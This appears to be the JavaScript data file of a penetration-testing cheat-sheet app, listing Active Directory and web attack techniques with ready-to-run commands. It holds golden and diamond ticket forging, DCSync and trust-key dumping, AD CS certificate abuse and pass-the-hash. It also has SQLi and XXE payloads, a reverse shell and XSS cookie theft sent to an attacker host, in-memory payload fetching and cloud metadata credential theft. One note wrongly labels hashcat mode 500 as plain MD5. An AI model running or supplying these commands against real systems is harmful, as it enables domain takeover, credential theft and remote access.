        tags: ['kerberos', 'active-directory', 'persistence', 'golden-ticket'],
        commands: [
          { id: 'gold1', label: 'Mimikatz golden ticket', os: 'Windows', command: 'mimikatz # kerberos::golden /user:Administrator /domain:$$DOMAIN /sid:$$SID /krbtgt:$$HASH /ptt', notes: 'Requires KRBTGT hash and domain SID.' },
          { id: 'gold2', label: 'ticketer.py', os: 'Linux', command: 'ticketer.py -nthash $$HASH -domain-sid $$SID -domain $$DOMAIN Administrator', notes: '' },
        ],
      },
      {
        id: 'lat-diamond',
        name: 'Diamond Ticket',
        description: 'Modify a legitimate TGT (instead of forging from scratch) — harder to detect than Golden Ticket.',
        tags: ['kerberos', 'active-directory', 'diamond-ticket', 'rubeus'],
        commands: [
          { id: 'dia1', label: 'Rubeus diamond (password)', os: 'Windows', command: 'Rubeus.exe diamond /tgtdeleg /ticketuser:$$USER /ticketuserid:<RID> /groups:512 /krbkey:$$HASH /domain:$$DOMAIN /dc:$$DC /enctype:aes /ptt', notes: '/tgtdeleg uses current TGT as base. 512 = Domain Admins.' },
          { id: 'dia2', label: 'Rubeus diamond (RC4)', os: 'Windows', command: 'Rubeus.exe diamond /krbkey:$$HASH /user:$$USER /password:$$PASSWORD /enctype:rc4 /ticketuser:Administrator /domain:$$DOMAIN /dc:$$DC /ptt', notes: 'Uses krbtgt RC4 key to modify the PAC.' },
        ],
      },
      {
        id: 'lat-cross-domain',
        name: 'Cross-Domain Trust Abuse',
        description: 'Abuse inter-domain trust tickets to move from child domain to parent forest/domain.',
        tags: ['kerberos', 'trusts', 'cross-domain', 'active-directory'],
        commands: [
          { id: 'xd1', label: 'Dump trust keys (Mimikatz)', os: 'Windows', command: 'mimikatz # lsadump::trust /patch', notes: 'Dump inter-realm trust keys from DC. Requires DA in child.' },
          { id: 'xd2', label: 'Dump trust keys (DCSync)', os: 'Windows', command: 'mimikatz # lsadump::dcsync /user:$$DOMAIN\krbtgt', notes: '' },
          { id: 'xd3', label: 'Forge inter-realm TGT (Mimikatz)', os: 'Windows', command: 'mimikatz # kerberos::golden /user:Administrator /domain:$$DOMAIN /sid:$$SID /sids:<parent-SID>-519 /rc4:<trust-key-hash> /service:krbtgt /target:<parent-domain> /ptt', notes: 'SIDs 519 = Enterprise Admins in parent domain.' },
          { id: 'xd4', label: 'Rubeus inter-realm TGS', os: 'Windows', command: 'Rubeus.exe asktgs /ticket:$$TICKET /service:krbtgt/$$DOMAIN /dc:$$DC /ptt', notes: 'Request TGS for parent krbtgt with forged ticket.' },
          { id: 'xd5', label: 'Rubeus asktgt (parent domain)', os: 'Windows', command: 'Rubeus.exe asktgt /user:$$USER /domain:<parent-domain> /rc4:$$HASH /dc:<parent-DC> /ptt', notes: 'Get TGT in parent domain.' },
        ],
      },
      {
        id: 'lat-rdp',
        name: 'RDP Access',
        description: 'Connect to the target via Remote Desktop Protocol.',
        tags: ['rdp', 'windows'],
        commands: [
          { id: 'rdp1', label: 'xfreerdp (creds)', os: 'Linux', command: 'xfreerdp /v:$$IP /u:$$USER /p:$$PASSWORD /dynamic-resolution +clipboard', notes: '' },
          { id: 'rdp2', label: 'xfreerdp (hash PTH)', os: 'Linux', command: 'xfreerdp /v:$$IP /u:$$USER /pth:$$HASH /dynamic-resolution', notes: 'Pass-the-hash via RDP (Restricted Admin mode required).' },
          { id: 'rdp3', label: 'Enable RDP (if needed)', os: 'Windows', command: 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f', notes: 'Requires admin access.' },
        ],
      },
    ],
  },

  /* ── 11. AD Certificate Services (AD CS) ────────────────────────────────── */
  {
    id: 'adcs',
    name: 'AD CS',
    icon: '📜',
    techniques: [
      {
        ...
        description: 'Enroll in a template that allows Subject Alternative Name (SAN) in the CSR — request a cert as any user including DA.',
        tags: ['adcs', 'certificate', 'active-directory', 'privesc'],
        commands: [
          { id: 'esc1-1', label: 'Find vulnerable templates (Certify)', os: 'Windows', command: 'Certify.exe find /vulnerable', notes: 'Lists templates with ESC1/ESC2/ESC3/etc misconfigs.' },
          { id: 'esc1-2', label: 'Request cert as Admin (ESC1)', os: 'Windows', command: 'Certify.exe request /ca:$$DC\<CA-NAME> /template:<TEMPLATE> /altname:Administrator', notes: 'Saves as cert.pem + key.pem.' },
          { id: 'esc1-3', label: 'Convert PEM to PFX', os: 'Linux', command: 'openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx', notes: 'Required for Rubeus PKINIT.' },
          { id: 'esc1-4', label: 'PKINIT — get TGT from cert', os: 'Windows', command: 'Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:<pfx-pass> /domain:$$DOMAIN /dc:$$DC /ptt', notes: 'Full DA access from certificate.' },
          { id: 'esc1-5', label: 'Get NT hash from cert', os: 'Windows', command: 'Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials /show', notes: '/getcredentials extracts NTLM hash via U2U.' },
        ],
      },
      {
        id: 'adcs-esc3',
        name: 'ESC3 — Enrollment Agent Abuse',
        description: 'Enroll as an enrollment agent, then request certificates on behalf of other users.',
        tags: ['adcs', 'certificate', 'active-directory'],
        commands: [
          { id: 'esc3-1', label: 'Request enrollment agent cert', os: 'Windows', command: 'Certify.exe request /ca:$$DC\<CA-NAME> /template:EnrollmentAgentOffline', notes: 'Step 1: Get an enrollment agent certificate.' },
          { id: 'esc3-2', label: 'Request cert on behalf of Admin', os: 'Windows', command: 'Certify.exe request /ca:$$DC\<CA-NAME> /template:User /onbehalfof:$$DOMAIN\Administrator /enrollcert:agent.pfx /enrollcertpw:<pass>', notes: 'Step 2: Enroll as Administrator.' },
          { id: 'esc3-3', label: 'Use cert for TGT', os: 'Windows', command: 'Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:<pass> /ptt', notes: 'Step 3: Get TGT.' },
        ],
      },
      {
        id: 'adcs-esc6',
        name: 'ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2',
        description: 'CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set — any certificate can include an arbitrary SAN.',
        tags: ['adcs', 'certificate', 'active-directory'],
        commands: [
          { id: 'esc6-1', label: 'Check CA for ESC6 flag', os: 'Windows', command: 'Certify.exe find /vulnerable', notes: 'Look for EDITF_ATTRIBUTESUBJECTALTNAME2 in CA flags.' },
          { id: 'esc6-2', label: 'Request cert with SAN override', os: 'Windows', command: 'Certify.exe request /ca:$$DC\<CA-NAME> /template:User /altname:Administrator', notes: 'Works on any template when ESC6 is present — same exploitation as ESC1.' },
          { id: 'esc6-3', label: 'PKINIT to get TGT', os: 'Windows', command: 'Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:<pass> /ptt', notes: '' },
        ],
      },
    ],
  },
    ...
    techniques: [
      ...
      },
      {
        ...
        commands: [
          ...
          { id: 'ft6', label: 'xcopy from share', os: 'Windows', command: 'xcopy \\$$LHOST\share\Tools C:\Temp\ /E /I', notes: 'Copy tools from attacker SMB share.' },
          ...
          { id: 'ft8', label: 'NetLoader (in-memory)', os: 'Windows', command: 'C:\Users\Public\Loader.exe -path http://$$LHOST/tool.exe', notes: 'Fetch and run in memory via NetLoader — no disk write.' },
...
/* ─── CWE Topics (Security Weaknesses) ────────────────────────────────────── */
const CWE_TOPICS = [
  {
    id: 'injection',
    ...
    techniques: [
      {
        id: 'sqli',
        name: 'SQL Injection',
        description: 'Attacker inserts malicious SQL code into input fields, bypassing authentication or extracting data.',
        tags: ['web', 'database', 'owasp-a03'],
        commands: [
          { id: 'sqli1', label: 'Test for SQLi', os: 'Any', command: "' OR '1'='1", notes: 'Simple test payload in login form.' },
          { id: 'sqli2', label: 'Union-based SQLi', os: 'Any', command: "' UNION SELECT NULL,username,password FROM users--", notes: 'Extract data via UNION.' },
          { id: 'sqli3', label: 'Time-based blind SQLi', os: 'Any', command: "'; WAITFOR DELAY '00:00:05'--", notes: 'Detect presence via response time.' },
          { id: 'sqli4', label: 'sqlmap auto-exploit', os: 'Linux', command: 'sqlmap -u "http://$$IP/page?id=1" --dbs', notes: 'Automated SQLi exploitation.' },
        ],
      },
      {
        id: 'cmdi',
        name: 'Command Injection',
        description: 'Attacker injects OS commands through application input, gaining shell access.',
        tags: ['web', 'rce', 'owasp-a03'],
        commands: [
          { id: 'cmdi1', label: 'Test with semicolon', os: 'Any', command: '; whoami', notes: 'Simple command separator test.' },
          { id: 'cmdi2', label: 'Test with backticks', os: 'Any', command: '`id`', notes: 'Backtick command substitution.' },
          { id: 'cmdi3', label: 'Test with $(...)', os: 'Any', command: '$(whoami)', notes: 'Modern shell command substitution.' },
          { id: 'cmdi4', label: 'Reverse shell via CMDi', os: 'Any', command: '; bash -c "bash -i >& /dev/tcp/$$LHOST/$$LPORT 0>&1"', notes: 'Gain interactive shell.' },
        ],
      },
      {
        id: 'ldapi',
        name: 'LDAP Injection',
        description: 'Attacker manipulates LDAP queries to bypass filters and access unauthorized data.',
        tags: ['web', 'ldap', 'directory'],
        commands: [
          { id: 'ldapi1', label: 'Bypass filter', os: 'Any', command: '*', notes: 'Replace filter parameter with wildcard.' },
          { id: 'ldapi2', label: 'Enumerate users', os: 'Any', command: '*)(|(uid=*', notes: 'Extract all users via LDAP.' },
        ],
      },
    ],
  },
    ...
    techniques: [
      {
        ...
        description: 'Systematically try passwords/usernames to gain unauthorized access.',
        tags: ['auth', 'credentials'],
        commands: [
          { id: 'bf1', label: 'Hydra HTTP basic', os: 'Linux', command: 'hydra -l admin -P $$WORDLIST http://$$IP/login -U', notes: 'Attack HTTP basic auth.' },
          { id: 'bf2', label: 'Hydra SSH', os: 'Linux', command: 'hydra -L users.txt -P passwords.txt ssh://$$IP', notes: 'SSH brute force.' },
          { id: 'bf3', label: 'Hashcat rule-based', os: 'Linux', command: 'hashcat -m 1000 hashes.txt $$WORDLIST -r rules/dive.rule', notes: 'Smart password generation via rules.' },
        ],
      },
      {
        id: 'session-mgmt',
        name: 'Session Management Flaws',
        description: 'Weak or predictable session tokens allowing session hijacking or fixation.',
        tags: ['auth', 'session', 'cookies'],
        commands: [
          { id: 'sess1', label: 'Inspect cookies', os: 'Any', command: 'document.cookie', notes: 'Browser console to view session tokens.' },
          { id: 'sess2', label: 'JWT decode', os: 'Linux', command: 'echo "$$TOKEN" | cut -d. -f2 | base64 -d | jq', notes: 'Decode JWT payload.' },
          { id: 'sess3', label: 'Burp Sequencer', os: 'Any', command: 'Intercept session tokens in Burp Suite and run Sequencer analysis.', notes: 'Analyze token randomness.' },
        ],
      },
    ],
  },
    ...
    techniques: [
      {
        id: 'reflected-xss',
        name: 'Reflected XSS',
        description: "Malicious script reflected in URL/response, executed in victim's browser.",
        tags: ['web', 'client-side', 'owasp-a03'],
        commands: [
          { id: 'rxss1', label: 'Simple payload', os: 'Any', command: '<script>alert("XSS")</script>', notes: 'Basic test payload.' },
          { id: 'rxss2', label: 'Image tag bypass', os: 'Any', command: '<img src=x onerror="alert(document.cookie)">', notes: 'Bypass if <script> is filtered.' },
          { id: 'rxss3', label: 'SVG payload', os: 'Any', command: '<svg onload="alert(1)">', notes: 'SVG-based XSS.' },
        ],
      },
      {
        id: 'stored-xss',
        name: 'Stored XSS',
        description: 'Malicious script stored in database, executed when victim visits page.',
        tags: ['web', 'database', 'persistent'],
        commands: [
          { id: 'sxss1', label: 'Store via form', os: 'Any', command: "<img src=x onerror=\"fetch('http://$$LHOST/steal?cookie='+document.cookie)\">", notes: 'Inject into comment/post field.' },
          { id: 'sxss2', label: 'Extract cookies on load', os: 'Any', command: '<script>new Image().src="http://$$LHOST/log?c="+btoa(document.cookie)</script>', notes: 'Exfiltrate to attacker server.' },
        ],
      },
    ],
  },
    ...
    techniques: [
      {
        ...
        description: "Attacker modifies parameter to access other users' resources.",
        tags: ['auth', 'authorization', 'owasp-a01'],
        commands: [
          { id: 'idor1', label: 'Enumerate IDs', os: 'Any', command: 'Increment /api/user/123 to /api/user/124, 125, etc.', notes: 'Check if sequential IDs are accessible.' },
          { id: 'idor2', label: 'Test via Burp Intruder', os: 'Any', command: 'Intercept request, select ID parameter, run Intruder attack.', notes: 'Automate IDOR discovery.' },
        ],
      },
      {
        id: 'privilege-escalation-ac',
        name: 'Privilege Escalation',
        description: 'User elevates privileges to access admin functionality.',
        tags: ['authorization', 'privesc'],
        commands: [
          { id: 'pe1', label: 'Test admin pages', os: 'Any', command: 'curl -H "Authorization: Bearer $$TOKEN" http://$$IP/admin', notes: 'Try accessing restricted pages.' },
          { id: 'pe2', label: 'Modify role in JWT', os: 'Any', command: 'Edit JWT payload role=user to role=admin, re-sign if no key pinning.', notes: 'JWT role elevation.' },
        ],
      },
    ],
  },
    ...
    techniques: [
      {
        ...
        description: 'Use of outdated or weak algorithms (MD5, DES, etc.).',
        tags: ['crypto', 'hash'],
        commands: [
          { id: 'wc1', label: 'Crack MD5 hash', os: 'Linux', command: 'hashcat -m 500 hash.txt $$WORDLIST', notes: 'MD5 is fast to crack (mode 500).' },
          { id: 'wc2', label: 'Check TLS version', os: 'Linux', command: 'nmap --script ssl-enum-ciphers -p 443 $$IP', notes: 'Identify weak SSL/TLS versions.' },
          { id: 'wc3', label: 'Downgrade TLS attack', os: 'Linux', command: 'sslstrip -l 8080 -w logfile', notes: 'Force downgrade to HTTP.' },
        ],
      },
      {
        id: 'exposed-secrets',
        name: 'Exposed Secrets',
        description: 'API keys, passwords, or tokens exposed in code/config.',
        tags: ['secrets', 'recon'],
        commands: [
          { id: 'sec1', label: 'Search GitHub', os: 'Any', command: 'github search "$$DOMAIN api_key OR password OR token"', notes: 'Use GitHub search for exposed secrets.' },
          { id: 'sec2', label: 'GitRob scan', os: 'Linux', command: 'gitrob scan -o $$DOMAIN', notes: 'Automated secret finder in Git repos.' },
          { id: 'sec3', label: 'Grep source code', os: 'Linux', command: 'grep -r "api_key\\|password\\|secret" /var/www/html/', notes: 'Search web root for hardcoded secrets.' },
        ],
      },
    ],
  },
    ...
    techniques: [
      {
        ...
        description: 'Attacker manipulates XML parser to read files or perform SSRF.',
        tags: ['xml', 'file-disclosure', 'rce'],
        commands: [
          { id: 'xxe1', label: 'Basic XXE payload', os: 'Any', command: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', notes: 'Read local files via XXE.' },
          { id: 'xxe2', label: 'Billion laughs DoS', os: 'Any', command: 'Send deeply nested XML to crash server.', notes: 'Denial of service via XXE.' },
        ],
      },
      {
        id: 'ssrf',
        name: 'Server-Side Request Forgery (SSRF)',
        description: 'Server makes requests to unintended locations (internal services, cloud metadata).',
        tags: ['web', 'network', 'cloud'],
        commands: [
          { id: 'ssrf1', label: 'Test SSRF via URL', os: 'Any', command: 'http://localhost:8080 or http://127.0.0.1:9200', notes: 'Try internal IPs in URL parameters.' },
          { id: 'ssrf2', label: 'AWS metadata theft', os: 'Any', command: 'http://169.254.169.254/latest/meta-data/', notes: 'Steal AWS credentials from EC2 metadata.' },
          { id: 'ssrf3', label: 'Gopher protocol', os: 'Any', command: 'gopher://127.0.0.1:6379/_COMMAND', notes: 'Access Redis or other services via gopher.' },
        ],
      },
    ],
  },
